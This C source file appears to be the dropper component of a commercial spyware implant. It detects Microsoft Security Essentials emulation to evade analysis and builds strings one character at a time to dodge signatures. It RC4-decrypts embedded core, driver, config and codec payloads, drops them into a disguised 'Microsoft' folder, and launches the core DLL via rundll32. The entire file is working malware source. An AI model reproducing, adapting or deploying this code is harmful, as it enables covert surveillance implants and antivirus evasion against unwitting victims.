#include "DropperCode.h"
#include "DropperHeader.h"
#include "depack.h"
#include "rc4.h"


#ifdef _DEBUG
#pragma message("")
#pragma message("****************************")
#pragma message("***** NOT FOR RELEASE ******")
#pragma message("*** VERBOSE MODE ENABLED ***")
#pragma message("****************************")
#pragma message("")
#endif


// XXX add filename
__forceinline BOOL dump_to_file(DataSectionBlob& name, DataSectionCryptoPack& file, DropperHeader* header, DUMPFILE fn_dump)
{
	if (header == 0 || file.offset == 0 || file.size == 0 
		|| name.offset == 0 || name.size == 0 || fn_dump == 0)
	{
		return FALSE;
	}

	CHAR* fileName = (char *) (((char*)header) + name.offset);
	CHAR* fileData = (char *) (((char*)header) + file.offset);

	if (fileName == 0 || fileData == 0) 
	{
		return FALSE;
	}

	return DumpFile(fileName, fileData, file.size, file.original_size, header);
}

#pragma optimize( "", off ) // *** Disable all optimizations - we need code "as is"!
//#pragma code_seg(".extcd")  // *** Lets put all functions in a separated code segment

int __stdcall DropperEntryPoint(DropperHeader *header)
{
	// Check for Microsoft Security Essential emulation 
	char *fName = (char *)pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	pfn_GetModuleFileNameA(NULL, fName, MAX_PATH);
	DWORD prgLen = _STRLEN_(fName);
	
	// x86
	char x86MspEng[26] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', ' ', 'S', 'e', 'c', 'u', 'r' ,'i', 't', 'y', ' ', 'C', 'l', 'i', 'e', 'n', 't', 0x0 };
	for(DWORD i=0; i<prgLen; i++)
		if(!_STRCMP_(fName+i, x86MspEng))
			goto OEP_CALL;
	
	// x64
	char x64MspEng[12] = { ':', '\\', 'm', 'y', 'a', 'p', 'p', '.', 'e', 'x', 'e', 0x0 };
	if(!_STRCMP_(&fName[1], x64MspEng))
		goto OEP_CALL;
	pfn_VirtualFree(fName, 0, MEM_RELEASE);
	
	// End of MS sec essential emulation check 

	// Get user temporary directory
	//char lpTmpEnvVar[] = { '%', 'T', 'M', 'P', '%', 0x0 };
	char lpTmpEnvVar[] = { 'T', 'M', 'P', 0x0 };
	char * lpTmpDir = (char*) pfn_VirtualAlloc(NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	if ( NULL == lpTmpDir )
		goto OEP_CALL;

	SecureZeroMemory(lpTmpDir, MAX_PATH);
	DWORD dwRet = pfn_GetEnvironmentVariableA(lpTmpEnvVar, lpTmpDir, MAX_PATH); // FIXME: GetTempPath
	if (dwRet == 0) {
		char lpTempEnvVar[] = { 'T', 'E', 'M', 'P', 0x0 };
		dwRet = pfn_GetEnvironmentVariableA(lpTempEnvVar, lpTmpDir, MAX_PATH);
		if (dwRet == 0) {
			// we are unable to get the user TMP or TEMP directory,
			// so call the OEP ... we failed!
			pfn_VirtualFree(lpTmpDir, 0, MEM_RELEASE);
			goto OEP_CALL;
		}
	}
	
	// Go back one level (i.e. from Temp to its parent directory)
	if ( lpTmpDir[_STRLEN_(lpTmpDir)] == '\\' )
		lpTmpDir[_STRLEN_(lpTmpDir)] = '\0';
	
	char* dirsep = _STRRCHR_(lpTmpDir, '\\');
	if (dirsep != 0)
		*dirsep = '\0';	// cut the part after the last directory separator
	else
		goto OEP_CALL;
	
	char lpDirSep[] = { '\\', 0x0 };
	char lpSubDir[] = { 'M', 'i', 'c', 'r', 'o', 's', 'o', 'f', 't', 0x0 };
	_STRCAT_(lpTmpDir, lpDirSep);
	_STRCAT_(lpTmpDir, lpSubDir);

	// check if subdir Microsoft exists if not, then create it.
	DWORD FileAttributes = pfn_GetFileAttributesA(lpTmpDir);
	if (FileAttributes == INVALID_FILE_ATTRIBUTES || !(FileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	{
		DWORD ret = pfn_CreateDirectoryA(lpTmpDir, NULL);
		if (!ret)
			if (pfn_GetLastError() != ERROR_ALREADY_EXISTS) // non-sense but.. whatever.
				goto OEP_CALL;
	}

	_STRCAT_(lpTmpDir, lpDirSep);
	_STRCAT_(lpTmpDir, header->instDir); // lpInstDir);
	_STRCAT_(lpTmpDir, lpDirSep);

	BOOL bRet = pfn_CreateDirectoryA(lpTmpDir, NULL);
	if (bRet == FALSE) {
		DWORD dwLastError = pfn_GetLastError();
		switch (dwLastError) {
			case ERROR_ALREADY_EXISTS:
				// go on, simply overwrite all files
				break;
			case ERROR_PATH_NOT_FOUND:
				// mmmh ... something wrong here, user temp dir should be present!
				
				pfn_VirtualFree(lpTmpDir, 0, MEM_RELEASE);
				goto OEP_CALL;
				break;
		}
	}

	// directory created or already present, so jump into it
	pfn_SetCurrentDirectoryA(lpTmpDir);

	// add core.dll to path, will be used to call HFF8 later
	_STRCAT_(lpTmpDir, (char *) (((char*)header) + header->files.names.core.offset));
	header->dllPath = lpTmpDir;
	
	BOOL ret = FALSE;
	// CORE -- FIX FIX FIX
	HANDLE h2 = pfn_CreateFileA(((char*)header) + header->files.names.core.offset, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (h2 == INVALID_HANDLE_VALUE)
	{
		if (pfn_GetLastError() != ERROR_FILE_NOT_FOUND)
		{
		}
	}
	else
	{
		pfn_CloseHandle(h2);
		// basta il nome senza path perche' abbiamo fatto SetCurrentDirectoryA
		HMODULE h = pfn_GetModuleHandle(((char*)header) + header->files.names.core.offset); 
		if (h != NULL)
		{
			ULONG i = 0;
			while (pfn_FreeLibrary(h))
			{
				i++;
				if (i>4)
					break;
			}
		}
		if (!pfn_DeleteFileA(((char*)header) + header->files.names.core.offset))
		{

		}
	}

	ret = dump_to_file(header->files.names.core, header->files.core, header, DumpFile);
	if (FALSE == ret)	
		goto OEP_CALL;
	
	// CORE64
	ret = dump_to_file(header->files.names.core64, header->files.core64, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;

	// CONFIG
	ret = dump_to_file(header->files.names.config, header->files.config, header, DumpFile);
	if (FALSE == ret)	
		goto OEP_CALL;
	
	// DRIVER
	ret = dump_to_file(header->files.names.driver, header->files.driver, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;

	// DRIVER64
	ret = dump_to_file(header->files.names.driver64, header->files.driver64, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;

	// CODEC
	ret = dump_to_file(header->files.names.codec, header->files.codec, header, DumpFile);
	//if (FALSE == ret)	
	//	goto OEP_CALL;

	CoreThreadProc(header);

OEP_CALL:
	return 0;
}



BOOL WINAPI DumpFile(CHAR * fileName, CHAR* fileData, DWORD fileSize, DWORD originalSize, DropperHeader *header)
{	
	// decrypt data
	rc4_encrypt((const unsigned char *)header->rc4key, RC4KEYLEN, 0, (unsigned char *)fileData, fileSize);
	
	// decompress data
//	char* uncompressed = (char*) pfn_VirtualAlloc(NULL, originalSize, MEM_COMMIT, PAGE_READWRITE);
//	int uncompressed_size = aP_depack(fileData, uncompressed);
//	if (uncompressed_size != originalSize) 
//		return FALSE;

	char *uncompressed = fileData;

	// restore normal attributes if the file already exists
	pfn_SetFileAttributesA(fileName, FILE_ATTRIBUTE_NORMAL);

	if (pfn_GetCurrentProcessId() == 4) // bitdefender && panda && ...
		MessageBox(NULL, L"Program is loading", L"Program is loading", 0);

	HANDLE hFile = pfn_CreateFileA(fileName, 
		GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ, 
		NULL, 
		CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);

	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	// write data to file
	DWORD cbWritten = 0;
	BOOL bRet = pfn_WriteFile(hFile, uncompressed, originalSize, &cbWritten, NULL);
	if (bRet == FALSE)
		return FALSE;

	// close it
	pfn_CloseHandle(hFile);

	// free memory
	//pfn_VirtualFree(uncompressed, 0, MEM_RELEASE);
	return TRUE;
}



DWORD WINAPI CoreThreadProc(__in  LPVOID lpParameter)
{	
	DropperHeader* header = (DropperHeader*) lpParameter;

	CHAR strRunDLL[] = { '%', 's', 'y', 's', 't', 'e', 'm', 'r', 'o', 'o', 't', '%', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'r', 'u', 'n', 'd', 'l', 'l', '3', '2', '.', 'e', 'x', 'e', ' ', '"', 0x0 };
	CHAR strComma[] = { '"', ',', 0x0 };

	CHAR strHFF5[11];
	CHAR strHFF8[11];
	_MEMSET_(strHFF5, 0x0, 11);
	_MEMSET_(strHFF8, 0x0, 11);
	_MEMCPY_(strHFF5, header->eliteExports, 10);
	_MEMCPY_(strHFF8, header->eliteExports+11, 10);

	char* complete_path = (char*) pfn_VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
	_MEMSET_(complete_path, 0x0, 1024);
	_MEMCPY_(complete_path, strRunDLL, _STRLEN_(strRunDLL));
	_STRCAT_(complete_path, header->dllPath);
	_STRCAT_(complete_path, strComma);
	_STRCAT_(complete_path, strHFF8);

	HMODULE hLib = pfn_LoadLibraryA(header->dllPath);
	if (hLib == INVALID_HANDLE_VALUE)
		goto THREAD_EXIT;

	PCHAR pFuncName = (PCHAR) pfn_VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_READWRITE);
	_MEMSET_(pFuncName, 0x0, 1024);
	_MEMCPY_(pFuncName, strHFF5, strlen(strHFF5));

	HFF5 pfn_HFF5 = (HFF5) pfn_GetProcAddress(hLib, strHFF5);
	if (pfn_HFF5 == NULL)
		goto THREAD_EXIT;

	STARTUPINFO* startupinfo = (STARTUPINFO*) pfn_VirtualAlloc(NULL, sizeof(STARTUPINFO), MEM_COMMIT, PAGE_READWRITE);
	startupinfo->cb = sizeof(STARTUPINFO);

	PROCESS_INFORMATION* procinfo = (PROCESS_INFORMATION*) pfn_VirtualAlloc(NULL, sizeof(PROCESS_INFORMATION), MEM_COMMIT, PAGE_READWRITE);

	pfn_HFF5(complete_path, NULL, startupinfo, procinfo);

THREAD_EXIT:
	
	if (complete_path) pfn_VirtualFree(complete_path, 0, MEM_RELEASE);
	if (startupinfo) pfn_VirtualFree(startupinfo, 0, MEM_RELEASE);
	if (procinfo) pfn_VirtualFree(procinfo, 0, MEM_RELEASE);
	if (header->dllPath) pfn_VirtualFree(header->dllPath, 0, MEM_RELEASE);


	return 0;
}


